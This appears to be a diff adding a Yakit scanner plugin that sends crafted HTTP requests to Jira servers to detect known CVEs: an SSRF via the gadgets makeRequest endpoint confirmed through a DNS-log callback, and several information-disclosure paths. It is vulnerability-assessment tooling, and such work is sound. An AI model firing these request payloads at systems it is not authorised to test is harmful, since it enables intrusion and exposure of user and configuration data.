@@ -1,0 +1,159 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+// 准备发送的报文模版 
+Packet = `GET {{params(payload)}} HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+`
+
+//漏洞检测规则函数 
+rules = []
+addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
+    rules = append(rules, {
+        "packet": packet,
+        "payload": payload,
+        "check": check,
+        "type": riskType,
+        "typeVerbose": riskTypeVerbose,
+        "severity": severity,
+        "reference":reference,
+    })
+}
+addDynRule = func(payloadGenerator,riskType, riskTypeVerbose, severity,reference) {
+    rules = append(rules, {
+        "isDyn":true,
+        "packet": Packet,
+        "payloadGenerator": payloadGenerator,
+        "type": riskType,
+        "typeVerbose": riskTypeVerbose,
+        "severity": severity,
+        "reference":reference,
+    })
+}
+
+//添加动态规则
+addDynRule(()=>{
+    server, token, dnserr = risk.NewDNSLogDomain()
+    payload = str.f(`/plugins/servlet/gadgets/makeRequest?url=http://%v@%v`, str.HostPort(result.Target, result.Port), server)
+    checker = (rsp,header,body)=>{
+        sleep(5)
+        dnsdata, dnserr = risk.CheckDNSLogByToken(token)
+        if len(dnsdata) > 0 {
+            return true
+        }
+        return false
+    }
+    return payload,checker
+},"SSRF","jira-cve-2019-8451","high","https://jira.atlassian.com/browse/JRASERVER-69793")
+
+addDynRule(()=>{
+    server, token, dnserr = risk.NewDNSLogDomain()
+    payload = str.f(`/plugins/servlet/gadgets/makeRequest?url=https://%v@%v`, str.HostPort(result.Target, result.Port), server)
+    checker = (rsp,header,body)=>{
+        sleep(5)
+        dnsdata, dnserr = risk.CheckDNSLogByToken(token)
+        if len(dnsdata) > 0 {
+            return true
+        }
+        return false
+    }
+    return payload,checker
+},"SSRF","jira-cve-2019-8451","high","https://jira.atlassian.com/browse/JRASERVER-69793")
+
+addRule(Packet,`/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(header, `application/xml`) && str.MatchAllOfSubString(body, `<groupId>com.atlassian.jira</groupId>`) {
+        return true
+    }
+    return false
+},"信息泄露","jira-cve-2019-8442","high","https://nvd.nist.gov/vuln/detail/CVE-2019-8442")
+
+addRule(Packet,`/rest/api/latest/groupuserpicker?query=testuser12345&maxResults=50&showAvatar=false`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(header, `X-AREQUESTID`, `json`) && str.MatchAllOfSubString(body, `total`, `groups`, `header` ,`users`) {
+        return true
+    }
+    return false
+},"信息泄露","jira-cve-2019-8449","high","https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14179")
+
+addRule(Packet,`/secure/QueryComponent!Default.jspa`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(header, `json`) && str.MatchAllOfSubString(body, `com.atlassian.jira`) {
+        return true
+    }
+    return false
+},"信息泄露","jira-cve-2020-14179","high","https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14179")
+
+r = str.RandStr(8)
+payload1 = str.f(`/secure/ViewUserHover.jspa?username=%v`, r)
+addRule(Packet,payload1,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `/secure/ViewProfile.jspa?name=`+r, `com.atlassian.jira`) {
+        return true
+    }
+    return false
+},"信息泄露","jira-cve-2020-14181","high","https://www.tenable.com/cve/CVE-2020-14181")
+
+
+//漏洞检测handle 
+handleRule = func(swg, isTls, addr, rule) {
+    swg.Add()
+    go func{
+        defer swg.Done()
+
+        defer func{
+            recover()
+        }
+        println("start")
+        if rule.isDyn{
+            println("dyn")
+            rule["payload"],rule["check"] = rule.payloadGenerator()
+        }
+        dump(rule["payload"])
+        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
+        if err != nil {
+            yakit.Error("poc.HTTP error: %v", err)
+            return
+        }
+        header, body = poc.Split(resp)
+        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
+        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
+        url = urlIns.String()
+        if rule.check(rspIns, header, body) {
+            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
+            risk.NewRisk(
+                url, risk.severity(rule.severity), 
+                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
+                risk.titleVerbose(sprintf("reference %v", rule.reference)),
+                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
+                risk.payload(rule.payload), risk.details({
+                    "request": req,
+                    "response": resp,
+                    "url": url,
+                }),
+            )
+            return
+        }
+        return
+    }
+}
+
+
+
+handle = func(result) {
+    if !result.IsOpen() {
+        return
+    }
+
+    //判断是否是http
+    if len(result.Fingerprint.HttpFlows) <= 0 {
+        return
+    }
+    addr = str.HostPort(result.Target, result.Port)
+    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
+
+    // 漏洞检测
+    swg = sync.NewSizedWaitGroup(10)
+    for _, rule = range rules {
+        handleRule(swg, isTls, addr, rule)
+    }
+    swg.Wait()
+}
